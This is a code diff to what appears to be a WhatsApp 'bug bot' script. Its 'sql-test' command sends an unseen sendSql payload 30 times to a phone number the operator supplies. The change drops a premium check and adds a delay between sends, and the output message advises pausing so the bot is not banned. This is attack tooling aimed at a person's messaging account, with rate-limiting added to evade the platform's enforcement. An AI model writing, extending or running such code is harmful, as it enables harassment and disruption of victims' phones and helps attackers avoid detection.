@@ -1426,7 +1426,6 @@ sam.sendMessage(prem1+'@s.whatsapp.net', {text: `You are now the bot owner/contr
 break
 case 'sql-test': {
 if (!isCreator) return reply(mess.owner)
-if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`*Example*: ${prefix + command} 2547392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`> The number starts with the number 0. Replace it with the number starting with the country code\n\n> Example : ${prefix + command} 2547392784527`)
@@ -1434,6 +1433,7 @@ let target = bijipler + '@s.whatsapp.net'
 await reply(mess.bugrespon)
 for (let j = 0; j < 30; j++) {
 await sendSql(target)
+await sleep(2000)
 }
 
 await reply(`_Successfully spider has deliver 🕷️ to ${bijipler} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
